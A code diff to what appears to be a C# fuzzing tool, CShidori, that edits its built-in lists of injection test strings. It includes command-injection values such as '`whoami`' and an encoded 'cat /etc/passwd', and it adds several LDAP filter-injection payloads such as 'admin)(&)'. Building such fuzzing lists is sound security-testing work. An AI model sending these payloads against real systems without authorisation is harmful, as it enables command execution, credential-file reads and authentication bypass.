@@ -18,9 +18,8 @@ namespace CShidori
             string ip = Misc.GetIp();
             
             String[] misc = new string[] {
-            "", "*",";", "&", "%", ";", "[", "]", "(", ")","|", "?", "\\", "'", "\"", "@", "#", "!",
-            "null","$null", "`whoami`", "uname%20-a", "%3Bcat%20/etc/passwd"
-
+            "*",";", "&", "%", ";", "[", "]", "(", ")","|", "?", "\\", "'", "\"", "@", "#", "!",
+            "null","$null", "`whoami`", "uname%20-a", "%3Bcat%20/etc/passwd", ""
             };
             results.AddRange(misc);
 
@@ -49,7 +48,7 @@ namespace CShidori
             "&amp;",// &
             "&lt;", // <
             "&gt;", // >
-            "\n","\r", "\\"            
+            "n\nn","r\rr", "s\\s"            
             };
             results.AddRange(html);
 
@@ -100,7 +99,15 @@ namespace CShidori
             results.AddRange(xml);
 
             String[] ldap = new string[] {
-             "*", "user=*)(uid=*))(|(uid=*",
+             "*",
+             "*)(&",
+             "*)(|&",
+             "pwd)",
+             "*)(|(*",
+             "*))%00",
+             "admin)(&)",
+             "user=*)(uid=*))(|(uid=*",
+
             };
             results.AddRange(ldap);
 
